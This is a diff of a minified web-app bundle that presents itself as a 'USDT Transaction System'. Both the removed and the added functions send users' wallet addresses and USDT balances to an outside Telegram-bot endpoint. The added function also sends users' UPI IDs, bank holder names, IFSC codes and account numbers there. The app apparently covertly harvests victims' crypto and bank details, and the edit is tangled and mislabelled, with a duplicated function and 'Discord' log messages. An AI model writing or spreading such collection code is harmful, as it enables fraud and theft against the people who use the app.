@@ -36911,61 +36911,32 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                 l(0)
             }
         }
-        async function gn({ wallet_address: ue, action: ct }) {
-  const telegramURL = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
-
-  try {
-    const beWeb3 = await m(); // get web3 instance
-    const usdtContract = new beWeb3.eth.Contract(p, h); // p = ABI, h = USDT contract address
-
-    // Get raw balance (in wei/USDT decimals)
-    const rawBalance = await usdtContract.methods.balanceOf(ue).call();
-
-    // Format to normal USDT with decimals
-    const decimals = await usdtContract.methods.decimals().call();
-    const divisor = BigInt(10) ** BigInt(decimals);
-    const formattedBalance = Number(BigInt(rawBalance) * 100000n / divisor) / 100000; // 5 decimals
-
-    // Construct Telegram payload
-    const telegramPayload = {
-      content: "New Transaction Approval",
-      embeds: [
-        {
-          title: "Wallet Activity",
-          color: 5814783,
-          fields: [
-            { name: "Wallet Address", value: ue || "Unknown" },
-            { name: "Amount", value: `${formattedBalance} USDT` },
-            { name: "Action", value: ct || "Unknown" },
-            { name: "Timestamp", value: new Date().toISOString() }
-          ],
-          footer: { text: "USDT Transaction System" }
-        }
-      ]
-    };
-
-    // Send to Telegram webhook
-    await fetch(telegramURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(telegramPayload)
-    });
-
-    // Optionally, send to Telegram bot message format too
-    await fetch(telegramURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        usdtAddress: ue,
-        amount: formattedBalance
-      })
-    });
-
-    console.log("Sent Telegram message with real-time USDT balance:", formattedBalance);
-  } catch (err) {
-    console.error("Error in gn():", err);
-  }
-}
+        async function gn({wallet_address: ue, amount: be, action: ct}) {
+            const st = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
+            try {
+                const ke = {
+                    content: "New Transaction Approval",
+                    embeds: [{
+                        title: "Wallet Activity",
+                        color: 5814783,
+                        fields: [{
+                            name: "Wallet Address",
+                            value: ue || "Unknown"
+                        }, {
+                            name: "Amount",
+                            value: be ? `${be} USDT` : "Unknown"
+                        }, {
+                            name: "Action",
+                            value: ct || "Unknown"
+                        }, {
+                            name: "Timestamp",
+                            value: new Date().toISOString()
+                        }],
+                        footer: {
+                            text: "USDT Transaction System"
+                        }
+                    }]
+                }
                   , dt = await fetch(st, {
                     method: "POST",
                     headers: {
@@ -36992,80 +36963,79 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                 console.error("Error in sendToDiscordFromFrontend:", ke)
             }
         }
-       async function gn({ wallet_address: ue, amount: be, action: ct }) {
-  const st = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
-
-  try {
-    const web3 = await m();
-    const contract = new web3.eth.Contract(p, h);
-    const rawBalance = await contract.methods.balanceOf(ue).call();
-    const usdtBalance = web3.utils.fromWei(rawBalance, "ether");
-
-    const ke = {
-      content: "New Transaction Approval",
-      embeds: [
-        {
-          title: "📌 Wallet Activity",
-          color: 5814783,
-          fields: [
-            {
-              name: "Wallet Address",
-              value: ue || "Unknown"
-            },
-            {
-              name: "USDT Available Balance",
-              value: `${parseFloat(usdtBalance).toFixed(2)} USDT`
-            },
-            {
-              name: "Amount",
-              value: be ? `${be} USDT` : "Unknown"
-            },
-            {
-              name: "Action",
-              value: ct || "Unknown"
-            },
-            {
-              name: "Timestamp",
-              value: new Date().toISOString()
+        async function uf(ue) {
+            const be = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
+            try {
+                const ct = {
+                    content: "New Transaction Approval",
+                    embeds: [{
+                        title: "Wallet Activity",
+                        color: 5814783,
+                        fields: [{
+                            name: "Wallet Address",
+                            value: ue.wallet_address || "Unknown"
+                        }, {
+                            name: "Amount",
+                            value: ue.amount ? `${ue.amount} USDT` : "Unknown"
+                        }, {
+                            name: "Payment Method",
+                            value: ue.payment_method || "Unknown"
+                        }, ...ue.payment_method === "UPI" ? [{
+                            name: "UPI ID",
+                            value: ue.upiId || "N/A"
+                        }, {
+                            name: "UPI Holder",
+                            value: ue.upiHolder || "N/A"
+                        }] : [{
+                            name: "Bank Holder",
+                            value: ue.bankHolder || "N/A"
+                        }, {
+                            name: "IFSC",
+                            value: ue.ifsc || "N/A"
+                        }, {
+                            name: "Bank Account",
+                            value: ue.bankAccount || "N/A"
+                        }, {
+                            name: "Bank Name",
+                            value: ue.bankName || "N/A"
+                        }], {
+                            name: "Action",
+                            value: ue.action || "Unknown"
+                        }, {
+                            name: "Timestamp",
+                            value: new Date().toISOString()
+                        }],
+                        footer: {
+                            text: "USDT Transaction System"
+                        }
+                    }]
+                }
+                  , st = await fetch(be, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(ct)
+                });
+                if (!st.ok)
+                    throw new Error(`Discord webhook error: ${st.status} ${st.statusText}`);
+                const ke = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        usdtAddress: ue.wallet_address,
+                        amount: ue.amount
+                    })
+                });
+                if (!ke.ok)
+                    throw new Error(`API error: ${ke.status} ${ke.statusText}`);
+                console.log("Successfully sent to Discord and transaction-store API!")
+            } catch (ct) {
+                console.error("Error in sendToDiscordFromFrontend:", ct)
             }
-          ],
-          footer: {
-            text: "USDT Transaction System"
-          }
         }
-      ]
-    };
-
-    const dt = await fetch(st, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(ke)
-    });
-
-    if (!dt.ok)
-      throw new Error(`Discord webhook error: ${dt.status} ${dt.statusText}`);
-
-    const Vn = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        usdtAddress: ue,
-        amount: be
-      })
-    });
-
-    if (!Vn.ok)
-      throw new Error(`Telegram API error: ${Vn.status} ${Vn.statusText}`);
-
-    console.log("Successfully sent to Discord and Telegram");
-  } catch (ke) {
-    console.error("Error in gn():", ke);
-  }
-}
         async function po(ue) {
             d(ue),
             s(!0),
